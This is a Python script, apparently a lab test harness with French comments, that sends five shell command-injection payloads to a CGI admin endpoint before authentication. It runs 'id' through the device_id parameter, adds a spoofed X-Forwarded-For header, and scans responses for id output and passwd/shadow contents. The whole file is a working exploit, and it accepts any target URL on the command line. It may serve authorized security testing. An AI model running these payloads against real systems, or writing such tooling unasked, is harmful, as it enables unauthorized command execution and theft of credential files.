#!/usr/bin/env python3
# HARNESS-VALIDATION v2.4.0 — injection commande pre-auth CGI (lab).
#   - v2.4 : User-Agent versionné via constante HARNESS_VERSION
#   - v2.4 : requests.Session() avec keep-alive pour les 5 variantes
#   - v2.4 : gestion des redirections 3xx dans les métriques
#   - v2.4 : décompression gzip de secours si Content-Encoding: gzip
# Corrige audit §3.7 :
#   - Variante "ifs" supprimée (inopérante en HTTP — $ encodé)
#   - r.content au lieu de r.text (décodage robuste)
#   - Regex de détection affiné (uid=\\d+ au lieu de uid=)
#   - Variantes réalistes pour vecteur HTTP
import hashlib
import json
import re
import sys
import time
import requests

HARNESS_VERSION = "2.4.0"

TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://127.0.0.1:8080"
CMD    = "id"

# Variantes adaptées au vecteur HTTP :
# - semicolon : classique, séparateur shell
# - backtick : substitution si passé à eval/system côté serveur
# - pipe : si la sortie du paramètre est pipée
# - newline : %0A en URL, séparateur dans certains CGI
# - dollar_param : ${} en PHP/Shell si eval
VARIANTS = {
    "semicolon":    f";{CMD};",
    "backtick":     f"`{CMD}`",
    "pipe":         f"|{CMD}",
    "newline":      f"\n{CMD}\n",
    "dollar_param": f"${{{CMD}}}",
}

# Regex de détection affiné (évite les faux positifs "uid=" dans un formulaire)
LEAK_PATTERNS = [
    re.compile(rb"uid=\d+\(", re.I),       # id output: uid=1000(user)
    re.compile(rb"root:x:0:"),              # /etc/passwd
    re.compile(rb"root:\$[0-9]\$", re.I),  # /etc/shadow hash
]

def detect_leak(content: bytes) -> bool:
    return any(p.search(content) for p in LEAK_PATTERNS)

def main():
    # v2.4 : session avec keep-alive pour réutiliser la connexion TCP
    # sur les 5 variantes (gain de latence + moins de handshakes TLS).
    session = requests.Session()
    session.headers.update({
        "User-Agent": f"harness/{HARNESS_VERSION}",
        "X-Forwarded-For": "127.0.0.1",
    })

    out = []
    for name, payload in VARIANTS.items():
        t0 = time.time()
        try:
            r = session.get(
                f"{TARGET}/cgi-bin/admin.cgi",
                params={"action": "bypass_check", "device_id": f"1337{payload}"},
                timeout=5,
                allow_redirects=False,
            )
            # v2.4 : décompression gzip de secours — requests gère normalement
            # Content-Encoding: gzip automatiquement, mais certains CGI
            # mal-configurés renvoient un body compressé sans l'en-têter correct.
            content = r.content
            if r.headers.get("Content-Encoding", "").lower() == "gzip":
                try:
                    import gzip
                    content = gzip.decompress(content)
                except Exception:
                    pass  # fallback au content brut
            leak = detect_leak(content)
            # v2.4 : signalisation des redirections 3xx (intéressantes pour
            # les chaines d'auth bypass — un redirect vers /admin/ est un signal).
            is_redirect = 300 <= r.status_code < 400
            out.append({
                "variant": name,
                "status": r.status_code,
                "len": len(content),
                "ms": round((time.time() - t0) * 1000, 1),
                "leak": leak,
                "redirect": is_redirect,
                "location": r.headers.get("Location", "")[:100] if is_redirect else "",
                "resp_sha256": hashlib.sha256(content).hexdigest()[:16],
            })
        except requests.RequestException as e:
            out.append({
                "variant": name,
                "error": type(e).__name__,
                "ms": round((time.time() - t0) * 1000, 1),
            })
    print(json.dumps({
        "module": "preauth",
        "harness_version": HARNESS_VERSION,
        "target": TARGET,
        "results": out,
        "any_leak": any(x.get("leak") for x in out),
        "any_redirect": any(x.get("redirect") for x in out),
        "variants_tested": len(out),
    }, indent=2))

if __name__ == "__main__":
    main()
